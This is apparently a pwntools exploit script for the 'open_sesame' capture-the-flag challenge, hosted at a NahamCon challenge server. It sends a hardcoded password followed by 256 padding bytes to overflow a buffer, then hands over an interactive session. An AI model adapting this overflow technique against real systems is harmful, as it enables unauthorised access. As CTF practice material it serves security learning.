#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./open_sesame_patched")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = gdb.debug([exe.path])
	elif args.REMOTE:
		r = remote("challenge.nahamcon.com", 32282)
	else:
		r = process([exe.path])
	return r


def main():
	r = conn()

	passwd = b"OpenSesame!!!"
	offset = 256

	payload = b''.join([
		passwd,
		b'A' * offset,
		#cyclic(256),
	])

	prompt = r.recvuntil(b'')
	print(prompt)
	r.sendline(payload)

	r.interactive()


if __name__ == "__main__":
	main()
